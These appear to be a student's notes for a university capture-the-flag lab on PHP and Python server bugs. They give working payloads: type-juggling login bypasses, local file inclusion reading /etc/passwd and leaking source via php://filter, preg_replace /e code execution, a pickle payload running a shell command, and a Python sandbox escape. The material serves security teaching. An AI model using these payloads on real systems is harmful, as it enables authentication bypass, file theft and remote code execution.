## Lab 03 - server bugs

# Zadanie 1
https://uw2017.p4.team/type-juggling-ep1

http://meyerweb.com/eric/tools/dencoder/
```
{"login":"admin","token":0}
%7B%22login%22%3A%22admin%22%2C%22token%22%3A0%7D
```

# Zadanie 2
https://uw2017.p4.team/type-juggling-ep2/

https://www.functions-online.com/unserialize.html
https://www.base64encode.org
http://php.fnlist.com/php/serialize
http://phpepl.herokuapp.com

```
a:2:{s:8:"username";s:5:"admin";s:8:"password";i:0;}
YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtpOjA7fQ==
```

# Zadanie 3
https://uw2017.p4.team/type-juggling-ep3-hashcompare/

```
https://uw2017.p4.team/type-juggling-ep3-hashcompare/?var_a[]=1&var_b[]=2
```

# Zadanie 4
https://uw2017.p4.team/type-juggling-ep3-extra/

We are looking for sth that has the same beginning of the hash as '230'
hash for 230
`6da9003b743b65f4c0ccd295cc484e57`

https://md5db.net/explore/6DA9
Same hash beginning 'BUSH7ING'

# Zadanie 5
https://uw2017.p4.team/type-juggling-ep4-sorcerery/

We are looking for sth that will hash to `0e\d*` (after salting)

```
admin
6543210
```

# Zadanie 6
https://uw2017.p4.team/include-everything/

```
https://uw2017.p4.team/include-everything/?file=/etc/passwd
https://uw2017.p4.team/include-everything/?file=php://filter/convert.base64-encode/resource=home.php
```
```
<?php
  print('<p>First, try to read /etc/passwd.</p>');
  print('<p>Second, read home.php sourcecode.</p>');
  /*Next challange: /include-everything2/*/
?>
```

# Zadanie 7
https://uw2017.p4.team/include-everything2

# Zadanie 8
https://uw2017.p4.team/preg-replace/

https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace

```
/ma/e
Ala ma kota
system('ls')
```
```
https://uw2017.p4.team/preg-replace/916ef8976ac588e8b3d5e228708ed974
```

# Zadanie 9
https://uw2017.p4.team/pickle

```
c__builtin__
eval
(S'1+1'
tR.
```
```
c__builtin__
eval
(S'__import__("subprocess").check_output('cat /flag', shell=True)'
tR.
```

# Python
object subclasses -> catch_warnings
catch_warnings.__init__.__globals__['__builtins']['__import__']("os").system("echo a")
